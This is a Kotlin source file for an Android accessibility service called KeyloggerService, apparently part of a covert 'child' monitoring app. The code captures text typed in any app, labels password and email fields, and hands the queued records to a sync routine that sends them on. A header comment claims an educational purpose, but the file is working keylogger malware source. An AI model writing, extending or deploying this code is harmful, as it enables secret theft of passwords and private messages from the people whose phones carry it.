package com.divine.specter.child.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.divine.specter.child.ChildApplication
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.serialization.Serializable
import java.util.concurrent.ConcurrentLinkedQueue

/**
 * Keylogger via AccessibilityService - captures typed text.
 * Educational/training purposes only.
 */
class KeyloggerService : AccessibilityService() {

    companion object {
        private val keystrokes = ConcurrentLinkedQueue<Keystroke>()
        var instance: KeyloggerService? = null

        fun getAndClearKeystrokes(): List<Keystroke> {
            val captured = mutableListOf<Keystroke>()
            while (keystrokes.isNotEmpty()) {
                keystrokes.poll()?.let { captured.add(it) }
            }
            return captured
        }
    }

    @Serializable
    data class Keystroke(
        val text: String,
        val packageName: String,
        val timestamp: Long,
        val fieldType: String = "unknown"
    )

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this

        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_FOCUSED or
                        AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            notificationTimeout = 100
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                captureTextInput(event)
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                // Track focused field for context
                captureFieldFocus(event)
            }
        }
    }

    private fun captureTextInput(event: AccessibilityEvent) {
        val text = event.text?.joinToString("") ?: return
        if (text.isEmpty()) return

        val packageName = event.packageName?.toString() ?: "unknown"
        val fieldType = detectFieldType(event)

        val keystroke = Keystroke(
            text = text,
            packageName = packageName,
            timestamp = System.currentTimeMillis(),
            fieldType = fieldType
        )

        keystrokes.offer(keystroke)

        // Auto-sync if queue gets large
        if (keystrokes.size > 50) {
            CoroutineScope(Dispatchers.IO).launch {
                ChildApplication.instance.sync.syncNow()
            }
        }
    }

    private fun captureFieldFocus(event: AccessibilityEvent) {
        // Extract field hints/labels for context
        val source = event.source ?: return
        extractFieldContext(source)
    }

    private fun detectFieldType(event: AccessibilityEvent): String {
        val className = event.className?.toString() ?: return "unknown"
        val source = event.source

        return when {
            className.contains("EditText", ignoreCase = true) -> {
                source?.let { node ->
                    when {
                        node.isPassword -> "password"
                        node.inputType and 0x00000010 != 0 -> "password" // TYPE_TEXT_VARIATION_PASSWORD
                        node.inputType and 0x00000020 != 0 -> "email"
                        node.inputType and 0x00000003 != 0 -> "number"
                        else -> "text"
                    }
                } ?: "text"
            }
            else -> "unknown"
        }
    }

    private fun extractFieldContext(node: AccessibilityNodeInfo) {
        // Could extract hints, content descriptions for better context
        val hint = node.hintText?.toString()
        val label = node.contentDescription?.toString()

        // Store context for next keystroke
        // Implementation depends on data model
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }
}
